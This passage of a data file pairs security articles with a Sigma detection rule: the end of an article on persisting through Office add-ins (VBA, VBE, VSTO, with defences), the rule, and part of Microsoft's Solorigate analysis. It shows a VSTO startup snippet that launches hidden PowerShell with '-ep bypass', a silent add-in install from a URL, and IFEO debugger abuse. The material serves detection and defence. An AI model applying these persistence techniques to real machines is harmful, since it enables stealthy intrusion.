available:\n    HashedData Class\n    HNetCfg.NAT Traversal via UPnP Configuration Manager\n    HtmlDialog Class\n    HtmlDigestHelper Class\n    HNetCfg.FwMgr\n    HNetCfg.FwPolicy2\n    HNetCfg.HNetShare\n    HNetCfg.HNetCfgMgr\n    IETag Factory Class\n    IETag Factory\n    Image Rotation Class\n    IFilterGraph\n    InconspicuousAddin.ExtFunctions\n    Microsoft Uc Configuration Class\n    Microsoft UcDiagControl\n    Microsoft UcDiagControl for UcDiagnosticsInfo2\n    Microsoft UcDiagControl for UcMode category.\n  \n  (v) InconspicuousAddin.ExtFunctions\n  \n  ProgID: InconspicuousAddin.ExtFunctions  \n  C:\\Windows\\SysWow64\\uncscore.dll\n  \n             [OK] [Cancel] [Browse...]\n```\n\nOnce a user-defined function is integrated into Excel, an attacker would still need to find a way to have this command executed. Unfortunately, it doesn’t appear that you can overwrite built-in functions. Moreover, user-defined functions only execute when they are called, and will not execute again if they’ve previously been executed and the result is stored in a document.\n\nThe user-defined function therefore needs to be \"forcefully\" called, which can be done using VBA. This is not ideal, but arguably makes it harder for defenders to detect than when putting a full VBA persistence stager in a template or add-in – it’s less likely to draw suspicion as it could easily be interpreted as a standard Excel function. The following snippet of VBA is an example of how this could be achieved. When the workbook opens, a cell is selected (obviously in practice something other than 1:1 - A1), and its contents are replaced with the text string of the user-defined function call.\n\n```image\nAlt: AUTO3\nDescription: The image displays a snippet of VBA (Visual Basic for Applications) code within the context of an Excel add-in project. It shows a subroutine named 'Workbook_Open()' that sets the formula of a specific cell (A1) in 'Sheet1' to call a user-defined function, 'CountCellsRange(A1:A3)'. This is part of a discussion on how Automation add-ins can be used for persistence in Excel, illustrating how attackers might leverage Excel's functionality to execute arbitrary commands.\nTranscription: |\n  vb\n  Sub Workbook_Open()\n      Worksheets(\"Sheet1\").Cells(1, 1).Formula = \"=CountCellsRange(A1:A3)\"\n  End Sub\n```\n\n#### Benefits\n\n1. One command to setup (regasm).\n\n#### Disadvantages\n\n1. Requires administrative rights for COM registration.\n2. You still need a way of calling the user-defined function.\n3. Unlikely to be useful for persistence in VDI environments.\n\n## VBE Add-Ins\n\nIt is possible to create a persistence mechanism that does not leverage VBA itself, but the development environment for creating it – the VBA editor (VBE). The documentation for creating VBE add-ins is scarce; however, it was found to be based on the now familiar COM object using Office’s \"IDTExtensibility2\" interface. Through this COM object, arbitrary code could be executed on, for example, the launch of the VBA editor. As COM is used once again, it can be deployed using regasm. This deployment includes the creation of the registry key to inform the VBA editor that it should automatically load the add-in. This key is stored at:\n\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\VBE\\6.0\\Addins\\<VBEAddIn.Name>\n```\n\nThe key also contains a number of properties, which include a “FriendlyName” to refer to the registered COM object, and setting “LoadBehaviour” to “3” to inform the VBA editor to launch the add-in when the editor starts.\n\n```image\nAlt: VBE1\nDescription: The image displays a screenshot of a Windows Registry Editor view, showing a specific registry key path related to VBE add-ins in the context of Microsoft Office. It highlights the 'InconspicuousVBEAddIn.Connect' entry under the 'Addins' folder within the registry. The right side of the editor shows various properties associated with this registry entry, including 'CommandLineSafe', 'Description', 'FriendlyName', and 'LoadBehavior'. The 'LoadBehavior' is set to '3', indicating that the add-in is configured to load automatically when the VBA editor starts.\nTranscription: |\n  VBA\n    7.1\n      Trusted\n      VBE\n        6.0\n          Addins\n            InconspicuousVBEAddIn.Connect\n  \n  Name                  Type         Data\n  (Default)             REG_SZ       (value not set)\n  CommandLineSafe       REG_DWORD    0x00000000 (0)\n  Description           REG_SZ       An add-in that does inconspicuous things.\n  FriendlyName          REG_SZ       InconspicuousVBEAddIn\n  LoadBehavior          REG_DWORD    0x00000003 (3)\n```\n\nThe configured add-in can be seen within the VBA editor’s “Add-In Manager”.\n\n```image\nAlt: VBE2\nDescription: The image shows the 'Add-In Manager' interface from the VBA editor, displaying an add-in named 'InconspicuousVBEAddIn'. The add-in is marked as 'Startup / Loaded', indicating that it is configured to load automatically when the VBA editor starts. There is also a description stating, 'An add-in that does inconspicuous things.' The image highlights the options for load behavior, with checkboxes for 'Loaded/Unloaded' and 'Load on Startup' selected.\nTranscription: |\n  Add-In Manager\n  \n  Available Add-Ins                Load Behavior\n  InconspicuousVBEAddIn            Startup / Loaded\n  \n  Description\n  An add-in that does inconspicuous things.\n  \n  Load Behavior\n  [x] Loaded/Unloaded\n  [x] Load on Startup\n  [ ] Command Line\n  \n  [OK] [Cancel] [Help]\n```\n\n#### Benefits\n\n1. Easy to create a single add-in that works across multiple Office products without adaptation.\n2. One command to setup (regasm).\n\n#### Disadvantages\n\n1. Requires users to actually open the VBA editor!\n2. Requires administrative rights for COM registration.\n3. Unlikely to be useful for persistence in VDI environments.\n\n## VSTO Add-Ins\n\nVisual Studio Tools for Office (VSTO) will also be covered here for the purposes of completeness. VSTO is the replacement for COM add-ins in newer versions of Office (although the latter is still supported). Unlike COM add-ins, however, VSTO requires a special runtime to be installed which is not installed by default.\n\nA suitable place for storing persistence commands is the default “ThisAddIn-Startup” function which is configured to handle startup events (e.g., when the module is loaded when the application starts). An example is shown below.\n\n```\nprivate void ThisAddIn_Startup(object sender, System.EventArgs e)\n{\n    System.Diagnostics.Process process = new System.Diagnostics.Process();\n    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();\n    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\n    startInfo.FileName = \"powershell.exe\";\n    startInfo.Arguments = \"-ep bypass -C calc\";\n    process.StartInfo = startInfo;\n    process.Start();\n}\n```\n\nThe problem with VSTO add-ins arises when it comes to deploying them. In part, this is due to the requirement for the special runtime. If this is not installed, and there are minimal requirements to avoid detective security controls (unlikely), it can be installed silently with no user interaction (\"vstor_redist.exe\" in the example below).\n\nThe VSTO add-in (“*.vsto”) can then be installed using a binary (“VSTOInstaller.exe”) which is part of the runtime.\n\n```image\nAlt: VSTO1\nDescription: The image displays a command prompt window showcasing a command for installing the VSTO (Visual Studio Tools for Office) runtime and a specific add-in. The command includes paths to the 'vstor_redist.exe' and 'VSTOInstaller.exe', as well as parameters for a silent installation process. This is relevant for understanding the deployment of VSTO add-ins, as discussed in the accompanying text.\nTranscription: |\n  C:\\>vstor_redist.exe /q /norestart\n  \n  C:\\>\"C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VSTO\\10.0\\VSTOInstaller.exe\" /I \"C:\\VSTO-AddIn\\WordAddIn.vsto\"\n```\n\nUnfortunately, this causes a pop-up requiring the user to confirm the installation. You can add a \"/s\" for silent but the project needs to be signed by a trusted publisher or it will default to “Don't Install” and silently fail.\n\n```image\nAlt: VSTO2\nDescription: The image shows a pop-up window titled 'Microsoft Office Customization Installer.' The window indicates that the publisher of the add-in cannot be verified, raising a security warning. It displays the name of the add-in ('WordAddIn5'), its source file path, and notes that the publisher is 'Unknown Publisher.' The user is prompted with two options: 'Install' and 'Don't Install,' accompanied by a warning that untrusted customizations could harm the computer.\nTranscription: |\n  Microsoft Office Customization Installer\n  \n  Publisher cannot be verified\n  \n  Are you sure you want to install this customization?\n  \n  Name:        WordAddIn5\n  From:        file:///c:/VSTO-AddIn/WordAddIn5.vsto\n  Publisher:   Unknown Publisher\n  \n  While Office customizations can be useful, they can potentially harm your computer. If you do not trust the source, do not install this software. More Information...\n  \n  [Install] [Don't Install]\n```\n\nInterestingly \"VSTOInstaller.exe\" is a Microsoft signed binary and the location of the add-in can be specified as a URL (e.g., \"VSTOInstaller.exe /s /i http://192.168.7.129/OutlookAddIn1.vsto\"). Initially, this seems interesting as a potential application whitelisting bypass if a signed VSTO add-in is used. Unfortunately, Window’s trust model would restrict this. Although a user (or at least the organisation’s system administration team) may trust many certification authorities within the “Trusted Root” store, this trust is not implicitly extended to allow them to “publish” updates to software, and instead, there is a separate “Trusted Publisher” store for this which certification authorities have to be explicitly enabled in.\n\n#### Benefits\n\n1. Runtime installer (\"VSTOInstaller.exe\") is an MS signed binary, and can download (silently) the add-in over HTTP, although it needs to be from a trusted publisher.\n\n#### Disadvantages\n\n1. Requires non-standard VSTO runtime.\n2. Can't install silently without being signed by a trusted publisher, although a user might manually install it given that it’s an add-in for a trusted program.\n3. Unlikely to be useful for persistence in VDI environments.\n\n## Defending Against Malicious Add-Ins\n\nMalicious XLL, COM, Automation, and VSTO add-ins can easily be prevented through disabling add-ins within each Office application’s Trust Center (or through the appropriate registry keys).\n\n```image\nAlt: DEF1\nDescription: The image is a screenshot of the Trust Center settings in a Microsoft Office application. It shows the options available for managing add-ins, specifically highlighting the option to 'Disable all Application Add-ins (may impair functionality)' which is currently checked. The panel also includes options related to trusted publishers, trusted locations, and notifications for unsigned add-ins.\nTranscription: |\n  Trust Center\n  \n  Add-ins\n  \n  [ ] Require Application Add-ins to be signed by Trusted Publisher\n  \n  [ ] Disable notification for unsigned add-ins (code will remain disabled)\n  \n  [x] Disable all Application Add-ins (may impair functionality)\n```\n\nAlternatively, if add-ins are required, it is recommended they are required to be signed by a trusted publisher, and that user notifications are disabled. The user notifications that are presented when untrusted add-ins are used provide limited warning against potential security risk, and users may enable the content, especially if they’re opening a previously trusted document (e.g., one they’ve created). An example of a user notification is provided below.\n\n```image\nAlt: DEF2\nDescription: The image displays a security warning message from a Microsoft Office application. It indicates that some active content has been disabled and prompts the user to enable content for further interaction. This warning is relevant to the context of malicious add-ins, highlighting the importance of user awareness regarding the potential risks of enabling such content.\nTranscription: |\n  FILE  HOME  INSERT  DESIGN  PAGE LAYOUT  REFERENCES  MAILINGS  REVIEW  VIEW\n  \n  SECURITY WARNING  Some active content has been disabled. Click for more details.  Enable Content\n```\n\nAlthough the WLL and VBA add-ins self-define as add-ins, they’re not affected by the above Trust Center setting. This is particularly surprising in the case of WLL add-ins given it’s a DLL-based add-in.\n\nThe most effective way to mitigate against the risk of malicious WLL and VBA add-ins is to remove the “StartUp” trusted locations for each if they are not used. If they are required, at least for Excel and PowerPoint consider putting the required add-ins in the system-wide trusted location for this purpose, and removing the trusted location that exists within the user profile. This would force an attacker to escalate their privileges in order to use the system-wide location as a persistence mechanism. In both cases, organisations could also look to ensure that appropriate access control lists are established for the trusted locations in order to prevent users from adding or editing existing files.\n\nIt is further recommended that organisations look to develop a detective capability around identifying malicious add-ins. Three core aspects to this involve examining and validating the file system contents of the trusted locations, auditing the registry entries relevant for enabling add-ins, and monitoring for non-standard process relationships (e.g., examining the processes spawned by Office applications).",
    "sigma_rule": {
      "title": "Potential Persistence Via Microsoft Office Add-In",
      "id": "8e1cb247-6cf6-42fa-b440-3f27d57e9936",
      "status": "test",
      "description": "Detects potential persistence activity via startup add-ins that load when Microsoft Office starts (.wll/.xll are simply .dll fit for Word or Excel).",
      "references": [
        "Internal Research",
        "https://labs.withsecure.com/publications/add-in-opportunities-for-office-persistence",
        "https://github.com/redcanaryco/atomic-red-team/blob/4ae9580a1a8772db87a1b6cdb0d03e5af231e966/atomics/T1137.006/T1137.006.md"
      ],
      "author": "NVISO",
      "date": "2020-05-11",
      "modified": "2023-02-08",
      "tags": [
        "attack.persistence",
        "attack.t1137.006"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection_wlldropped": {
          "TargetFilename|contains": "\\Microsoft\\Word\\Startup\\",
          "TargetFilename|endswith": ".wll"
        },
        "selection_xlldropped": {
          "TargetFilename|contains": "\\Microsoft\\Excel\\Startup\\",
          "TargetFilename|endswith": ".xll"
        },
        "selection_xladropped": {
          "TargetFilename|contains": "Microsoft\\Excel\\XLSTART\\",
          "TargetFilename|endswith": ".xlam"
        },
        "selection_generic": {
          "TargetFilename|contains": "\\Microsoft\\Addins\\",
          "TargetFilename|endswith": [
            ".xlam",
            ".xla",
            ".ppam"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Legitimate add-ins"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_office_addin_persistence.yml"
  },
  "9": {
    "url": "https://www.microsoft.com/en-us/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/",
    "markdown": "# Deep dive into the Solorigate second-stage activation: From SUNBURST to TEARDROP and Raindrop\n\n**Published**: January 20, 2021\n\n---\n\n> **UPDATE:** Microsoft continues to work with partners and customers to expand our knowledge of the threat actor behind the nation-state cyberattacks that compromised the supply chain of SolarWinds and impacted multiple other organizations. Microsoft previously used ‘Solorigate’ as the primary designation for the actor, but moving forward, we want to place appropriate focus on the actors behind the sophisticated attacks, rather than one of the examples of malware used by the actors. Microsoft Threat Intelligence Center (MSTIC) has named the actor behind the attack against SolarWinds, the SUNBURST backdoor, TEARDROP malware, and related components as NOBELIUM. As we release new content and analysis, we will use NOBELIUM to refer to the actor and the campaign of attacks.\n\nMore than a month into the discovery of Solorigate, investigations continue to unearth new details that prove it is one of the most sophisticated and protracted intrusion attacks of the decade. Our continued analysis of threat data shows that the attackers behind Solorigate are skilled campaign operators who carefully planned and executed the attack, remaining elusive while maintaining persistence. These attackers appear to be knowledgeable about operations security and performing malicious activity with minimal footprint. In this blog, we’ll share new information to help better understand how the attack transpired. Our goal is to continue empowering the defender community by helping to increase their ability to hunt for the earliest artifacts of compromise and protect their networks from this threat.\n\nWe have published our in-depth analysis of the Solorigate backdoor malware (also referred to as SUNBURST by FireEye), the compromised DLL that was deployed on networks as part of SolarWinds products, that allowed attackers to gain backdoor access to affected devices. We have also detailed the hands-on-keyboard techniques that attackers employed on compromised endpoints using a powerful second-stage payload, one of several custom Cobalt Strike loaders, including the loader dubbed TEARDROP by FireEye and a variant named Raindrop by Symantec.\n\n## The missing link: From the Solorigate backdoor to Cobalt Strike implants\n\nAn attack timeline that SolarWinds disclosed in a recent blog showed that a fully functional Solorigate DLL backdoor was compiled at the end of February 2020 and distributed to systems sometime in late March. The same blog also said that the attackers removed the Solorigate backdoor code from SolarWinds’ build environment in June 2020.\n\nConsidering this timeline and the fact that the Solorigate backdoor was designed to stay dormant for at least two weeks, we approximate that the attackers spent a month or so in selecting victims and preparing unique Cobalt Strike implants as well as command-and-control (C2) infrastructure. This approximation means that real hands-on-keyboard activity most likely started as early as May.\n\n```image\nAlt: Timeline of Solorigate attacks\nDescription: The image is a timeline diagram detailing the sequence of events related to the Solorigate cyber attacks. It highlights key dates and activities such as the attackers starting to access SolarWinds in September 2019, the compilation and deployment of the Solorigate backdoor in February 2020, the distribution of the SUNBURST malware in March, and the activation of the TEARDROP implant in May 2020. Each event is annotated with specific actions taken by the attackers and is visually represented along a horizontal timeline that spans from September 2019 to January 2021.\nTranscription: |\n  Timeline of Solorigate attacks\n  \n  - Sep 4 – Attackers start accessing SolarWinds*\n  - Sep 12 – Attackers start injecting test code*\n  - Nov 4 – Attackers stop injecting test code*\n  - Feb 20 – Solorigate backdoor is compiled and deployed*\n  - March – Estimated start of distribution of Solorigate backdoor\n    - Distribution of SUNBURST and target-profiling**\n  - May – Estimated start of actual hands-on-keyboard attacks\n    - Activation of TEARDROP**\n    - Continued hands-on-keyboard activity**\n  - Jun 4 – Attackers remove malware from SolarWinds build environment*\n  - Dec 12 – Solorigate supply chain attack disclosed\n  \n  * Info disclosed by SolarWinds\n  ** Estimated timeline of activity based on forensic analysis\n```\n\n*Figure 1. Timeline of the protracted Solorigate attack*\n\nBut how exactly does this jump from the Solorigate backdoor (SUNBURST) to the Cobalt Strike loader (TEARDROP, Raindrop, and others) happen? What code gets triggered, and what indicators should defenders look for?\n\n```image\nAlt: Solorigate attack chain\nDescription: The image is a diagram illustrating the attack chain of the Solorigate operation, detailing the transition from the initial Solorigate backdoor (represented by 'solarwinds.businesslayerhost.exe') to the subsequent use of Cobalt Strike for remote access. It shows various steps such as activation of the backdoor, environment inspection, gathering of information, connection to command-and-control (C2) servers, and the eventual remote control of the system via the Cobalt Strike beacon. The flow includes visual indicators of the attacker's actions and the sequence of events leading to a hands-on-keyboard attack.\nTranscription: |\n  Attacker\n     |\n     |------------------- Initial C2\n     |------------------- Second C2\n     |------------------- Cobalt Strike C2\n     |\n  ON-PREMISES\n     |\n  DEVICE\n     |\n     |-- solarwinds.businesslayerhost.exe\n     |\n     |-- SolarWinds.Orion.Core.BusinessLayer.dll (compromised)\n     |\n     |-- Backdoor activates\n     |\n     |-- Backdoor inspects environment\n     |\n     |-- Backdoor gathers info\n     |\n     |-- Backdoor connects to initial C2, sends gathered info\n     |\n     |-- Cobalt Strike downloaded from a second C2\n     |\n     |-- Remote control via Cobalt Strike Beacon\n     |\n     |-- Hands-on-keyboard attack on premises\n```\n\n*Figure 2. Diagram of transition between Stage 1 and Stage 2 of the Solorigate attack*\n\nSophisticated attackers like those behind Solorigate have a goal of expansion and stealthy persistence to maximize the amount of time they can remain undetected and collect valuable information. It’s important for organizations to be able to look at forensic data across their entire environment to see how far attackers have traversed the network and how long they were there, in order to have confidence that attacks have been properly remediated from the environment. The best way to do that is with an extended detection and response (XDR) solution that enables organizations to replay past events to look for activity that might reveal the presence of an attacker on the network. Affected organizations without an XDR solution like Microsoft 365 Defender in place will have a difficult job of performing incident response.\n\nWhat we found from our hunting exercise across Microsoft 365 Defender data further confirms the high level of skill of the attackers and the painstaking planning of every detail to avoid discovery. To illustrate, the following diagram shows the entry vector attack chain at a glance:\n\n```image\nAlt: Transition from Solorigate to Cobalt Strike\nDescription: The image is a detailed diagram illustrating the transition from the Solorigate backdoor to the Cobalt Strike implants in a cyber attack chain. It visually represents the steps involved in the attack, organized into four categories: Network, File, Registry, and Process. Each category outlines specific actions, such as DNS connections, file drops for the VBScript and DLLs, registry modifications for persistence, and the execution of processes that trigger further malicious activities. The diagram also highlights the intended stealth and complexity of the attack strategy employed by the attackers, showcasing their methods for evading detection.\nTranscription: |\n  Network | File | Registry | Process\n  \n  SolarWinds.BusinessLayerHost.exe\n  - SolarWinds.Orion.Core.BusinessLayer.dll\n    - Solorigate backdoor\n      - connect → DNS: [DGA].avsvmcloud.com (1)\n  \n  dllhost.exe (random legit execution)\n  \n  wscript.exe\n  - C:\\Windows\\[folder1]\\trigger\\.vbs\n    - drop →\n      - C:\\Windows\\[folder1]\\trigger\\.vbs\n      - C:\\Windows\\[folder2]\\teardrop\\.dll (2)\n    - reg create →  \n      - `HKLM\\..\\IFEO\\dllhost.exe\\Debugger = \"wscript.exe C:\\Windows\\[folder1]\\trigger\\.vbs\"` (3)\n    - proc create →\n      - wscript.exe C:\\Windows\\[folder1]\\trigger\\.vbs (4)\n  \n  rundll32.exe\n  - C:\\Windows\\[folder2]\\custom loader\\.dll\n    - proc create →\n      - Rundll32.exe C:\\Windows\\[folder2]\\[teardrop].dll, Tk_[fakeexport] (5)\n    - reg delete →\n      - `HKLM\\..\\IFEO\\dllhost.exe\\Debugger` (6)\n    - connect →\n      - HTTPS: [C2 domain] (7)\n```\n\n*Figure 3. Transition from Solorigate backdoor to Cobalt Strike*\n\nWe spent countless hours investigating Microsoft Defender telemetry and other signals from potential patient-zero machines running the backdoored version of SolarWinds DLL. Most of these machines communicated with the initial randomly generated DNS domain *.avsvmcloud.com* but without significant activity (step #1). However, we saw limited cases in May and June where the initial DNS network communication was closely followed by network activity on port 443 (HTTPS) to other legit-looking domains (step #7). On these handful of machines, we performed deep inspection of telemetry.\n\nWe know that the Solorigate backdoor only activates for certain victim profiles, and when this happens, the executing process (usually *SolarWinds.BusinessLayerHost.exe*) creates two files on disk (step #2):\n\n- A VBScript, typically named after existing services or folders to blend into legitimate activities on the machine\n- A second-stage DLL implant, a custom Cobalt Strike loader, typically compiled uniquely per machine and written into a legitimate-looking subfolder in *%WinDir%* (e.g., *C:\\Windows*)\n\nAt this point the attackers are ready to activate the Cobalt Strike implant. However, the attackers apparently deem the powerful SolarWinds backdoor too valuable to lose in case of discovery, so they tried to separate the Cobalt Strike loader’s execution from the SolarWinds process as much as possible. Their hope is that, even if they lose the Cobalt Strike implant due to detection, the compromised SolarWinds binary and the supply chain attack that preceded it are not exposed.\n\nThe attackers achieved this by having the SolarWinds process create an Image File Execution Options (IFEO) Debugger registry value for the process *dllhost.exe* (step #3). This is a known MITRE ATT&CK technique used for persistence, but it could also be abused to trigger execution of malicious code when a certain process is launched. Once the registry value is created, the attackers simply wait for the occasional execution of *dllhost.exe*, which might happen naturally on a system. This execution triggers a process launch of *wscript.exe* configured to run the VBScript file dropped in step #4.\n\nThe VBScript in turn runs *rundll32.exe*, activating the Cobalt Strike DLL (step #5) using a clean parent/child process tree completely disconnected from the SolarWinds process. Finally, the VBScript removes the previously created IFEO value to clean up any traces of execution (step #6) and also deletes the following registry keys related to HTTP proxy:\n\n- *HKEY_CURRENT_USER\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\AutoDetect*\n- *HKEY_CURRENT_USER\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\AutoConfigURL*\n\n## Analyzing the custom Cobalt Strike loaders\n\nIn our investigation, we identified several second-stage malware, including TEARDROP, Raindrop, and other custom loaders for the Cobalt Strike beacon. During the lateral movement phase, the custom loader DLLs are dropped mostly in existing Windows sub-directories. Below are some example paths (additional paths are listed at the end of this blog):\n\n- *C:\\Windows\\ELAMBKUP\\WdBoot.dll*\n- *C:\\Windows\\Registration\\crmlog.dll*\n- *C:\\Windows\\SKB\\LangModel.dll*\n- *C:\\Windows\\AppPatch\\AcWin.dll*\n- *C:\\Windows\\PrintDialog\\appxsig.dll*\n- *C:\\Windows\\Microsoft.NET\\Framework64\\sbscmp30.dll*\n- *C:\\Windows\\Panther\\MainQueueOnline.dll*\n- *C:\\Windows\\assembly\\GAC_64\\MSBuild\\3.5.0.0__b03f5f7f11d50a3a\\msbuild.dll*\n- *C:\\Windows\\LiveKernelReports\\KerRep.dll*\n\nThe files have names that resemble legitimate Windows file and directory names, once again demonstrating how the attackers attempted to blend in the environment and hide in plain sight:\n\n| Legitimate Windows file/directory                                           | Malicious custom loader                                                     |\n| --------------------------------------------------------------------------- | --------------------------------------------------------------------------- |\n| *C:\\Windows\\ELAMBKUP\\WdBoot.sys*                                            | *C:\\Windows\\ELAMBKUP\\WdBoot.dll*                                            |\n| *C:\\Windows\\Registration\\CRMLog*                                            | *C:\\Windows\\Registration\\crmlog.dll*                                        |\n| *C:\\Windows\\SKB\\LanguageModels*                                             | *C:\\Windows\\SKB\\LangModel.dll*                                              |\n| *C:\\Windows\\AppPatch\\AcRes.dll*                                             | *C:\\Windows\\AppPatch\\AcWin.dll*                                             |\n| *C:\\Windows\\PrintDialog\\appxsignature.p7x*                                  | *C:\\Windows\\PrintDialog\\appxsig.dll*                                        |\n| *C:\\Windows\\Microsoft.NET\\Framework64\\sbscmp10.dll*                         | *C:\\Windows\\Microsoft.NET\\Framework64\\sbscmp30.dll*                         |\n| *C:\\Windows\\Panther\\MainQueueOnline0.que*                                   | *C:\\Windows\\Panther\\MainQueueOnline.dll*                                    |\n| *C:\\Windows\\assembly\\GAC_64\\MSBuild\\ 3.5.0.0__b03f5f7f11d50a3a\\MSBuild.exe* | *C:\\Windows\\assembly\\GAC_64\\MSBuild\\ 3.5.0.0__b03f5f7f11d50a3a\\msbuild.dll* |\n\nTEARDROP, Raindrop, and the other custom Cobalt Strike Beacon loaders observed during the Solorigate investigation are likely generated using custom Artifact Kit templates. Each custom loader loads either a Beacon Reflective Loader or a preliminary loader that subsequently loads the Beacon Reflective Loader. Reflective DLL loading is a technique for loading a DLL into a process memory without using the Windows loader.\n\n```image\nAlt: Structure of the two variants of Cobalt Strike Beacon loaders\nDescription: The image displays a diagram illustrating the structure of two variants of Cobalt Strike Beacon loaders used in the Solorigate attacks. On the left, it showcases the TEARDROP variant, which includes a preliminary loader (Artifact Kit) containing a Cobalt Strike Reflective Loader and a 'Beacon' icon, emphasizing its function. On the right, the Raindrop variant is presented, showing its CODE and DATA sections, both containing a Cobalt Strike Reflective Loader and a 'Beacon' icon. The diagram is visually structured to convey technical details about the malware's composition.\nTranscription: |\n  Custom loader DLL (TEARDROP)\n  --------------------------------\n  Preliminary loader\n  (Artifact Kit)\n  --------------------------------\n  Cobalt Strike Reflective Loader\n  --------------------------------\n  Beacon\n  \n  Variant 1: TEARDROP\n  \n  Type A DLL\n  -------------------------------\n  CODE Section\n  -------------------------------\n  DATA Section\n  -------------------------------\n  Cobalt Strike Reflective Loader\n  --------------------------------\n  Beacon\n  \n  Variant 2: Other custom Cobalt Strike Beacon loaders\n  \n  Type B DLL (Raindrop)\n  -------------------------------\n  CODE Section\n  -------------------------------\n  DATA Section\n  -------------------------------\n  Cobalt Strike Reflective Loader\n  --------------------------------\n  Beacon\n```\n\n*Figure 4. Structure of the two variants of Cobalt Strike Beacon loaders observed in Solorigate attacks*\n\nIn the succeeding sections, we discuss the Cobalt Strike Beacon variants we observed in our Solorigate investigations.\n\n### Variant 1: TEARDROP\n\nTo date, Microsoft has analyzed two versions of the second-stage custom Cobalt Strike Beacon loader known as TEARDROP (detected as *Trojan:Win64/Solorigate.SA!dha* by Microsoft):\n\n- A service DLL (loaded by *svchost.exe*) with a *ServiceMain* function typically named *NetSetupServiceMain*\n- A standard non-Service DLL loaded by *rundll32.exe*\n\nIrrespective of the loading methodology, both versions have an export function that contains the trigger for the malicious code. The malicious code is executed in a new thread created by the export function. Upon execution, the malicious code attempts to open a file with a .jpg extension (e.g., *festive_computer.jpg*, *upbeat_anxiety.jpg*, *gracious_truth.jpg*, and *confident_promotion.jpg*). Further analysis is required to determine the purpose and role of the .jpg file referenced by each sample. The code also checks the presence of the Windows registry key *SOFTWARE\\Microsoft\\CTF* and terminates if the registry key is present or accessible. Next, the code proceeds to decode and subsequently execute an embedded custom preliminary loader.\n\n```image\nAlt: Structure of Variant 1 custom loader\nDescription: The image is a diagram illustrating the structure of the custom loader DLL known as TEARDROP. It is segmented into three layers: the outer layer labeled 'Custom loader DLL (TEARDROP)', the middle layer labeled 'Preliminary loader (Artifact Kit)', and the innermost layer labeled 'Cobalt Strike Reflective Loader', which contains an icon representing 'Beacon'. This visual representation clarifies the hierarchical relationship between the components involved in the TEARDROP custom loader's architecture.\nTranscription: |\n  Custom loader DLL (TEARDROP)\n  └── Preliminary loader (Artifact Kit)\n      └── Cobalt Strike Reflective Loader\n          └── Beacon\n```\n\n*Figure 5. Structure of Variant 1 custom loader*\n\nThe preliminary loader used by this variant of custom loader is typically generated using a Cobalt Strike Artifact Kit template (e.g., *bypass-pipe.c*):\n\n```image\nAlt: Disassembled function from preliminary loader\nDescription: The image displays disassembled code from a preliminary loader, likely used in conjunction with the Cobalt Strike Artifact Kit. It features a series of assembly language instructions, showcasing function calls and memory manipulation relevant to the loader's operation. The highlighted section indicates the loading of a shellcode to a named pipe, which is part of the execution flow for the malicious code. This technical detail is crucial for understanding the behavior and mechanics of the TEARDROP variant custom loader.\nTranscription: |\n  sub\n  rsp, 68h\n  call GetTickCount\n  mov ecx, 26AAh\n  mov edx, 5Ch\n  mov eax, Buffer ; Buffer\n  mov r8, 5Ch\n  mov [rsp+var_18], 5Ch ;\n  mov [rsp+var_20], 65h ;\n  mov dword ptr [rsp+8], [rsp+8+lpThreadId] ;\n  mov [rsp+var_1C], 2h ;\n  mov rdx, Format\n  sprintf\n  lea r8, server_write_shellcode_to_namedpipe ; lpStartAddress\n  mov ecx, lpThreadAttributes\n  mov [rsp+lpThreadId], 0 ; lpThreadId\n  mov [rsp+8+CreationFlags], 0 ; dwCreationFlags\n  mov r9d, lpParameter\n  xor rax, rax\n  mov ecx, dwStackSize\n  call CreateThread\n  xor rax, rax\n  jmp sub_68AC15B2\n```\n\n*Figure 6. Disassembled function from preliminary loader compiled from Artifact Kit’s bypass-pipe.c template*\n\nIn its true form, the custom Artifact Kit-generated preliminary loader is a DLL that has been transformed and loaded like shellcode in memory. The preliminary loader is responsible for loading the next-stage component, which is a Beacon Reflective Loader/DLL (Cobalt Strike Beacon is compiled as a reflective DLL). The Reflective Loader ultimately initializes and executes Beacon in memory.\n\n### Variant 2: Additional custom loaders\n\nIn our investigations, we came across additional custom loaders for Cobalt Strike’s Beacon that appear to be generated using custom Cobalt Strike Artifact Kit templates. Unlike TEARDROP, in which the malicious code is triggered by an export function, the malicious code in these variants is triggered directly from the DLL’s entry point, which creates a new thread to execute the malicious code. These Variant 2 custom loaders also contain an attacker-introduced export (using varying names) whose only purpose is to call the *Sleep()* function every minute.\n\n```image\nAlt: Custom export function from a Variant 2 loader\nDescription: The image depicts a snippet of code, illustrating an exported function from a Variant 2 custom loader associated with Cobalt Strike. It shows the function '__GetClasterInf', which includes assembly code to call the 'Sleep' function every 60,000 milliseconds. The code structure indicates how the malicious code is triggered directly from the DLL's entry point, as described in the provided context.\nTranscription: |\n  ; Exported entry  2. __GetClasterInf\n  \n  ; Attributes: noreturn\n  \n  public __GetClasterInf proc near\n      sub rsp, 28h\n  \n  loc_180204674:                     ; dwMilliseconds\n      mov     ecx, 60000\n      call    cs:__imp_Sleep\n      jmp     short loc_180204674\n  __GetClasterInf endp\n```\n\n*Figure 7. Example of a custom export function from a Variant 2 loader*\n\nAdditionally, unlike TEARDROP, these variants do not contain a custom preliminary loader, meaning the loader DLL de-obfuscates and subsequently executes the Cobalt Strike Reflective DLL in memory.\n\n```image\nAlt: Structure of Variant 2 custom Loader\nDescription: The image depicts a diagram illustrating the structure of a Custom Loader DLL used in malware operations. It shows the relationship between three components: the Custom Loader DLL, a Reflective Loader, and a Beacon. The Reflective Loader is positioned inside the Custom Loader DLL, and the Beacon is represented within the Reflective Loader, indicating the hierarchy and interaction among these elements in the malware's execution process.\nTranscription: |\n  +---------------------+\n  | Custom Loader DLL   |\n  |                     |\n  | +-----------------+ |\n  | | Reflective      | |\n  | | Loader          | |\n  | |                 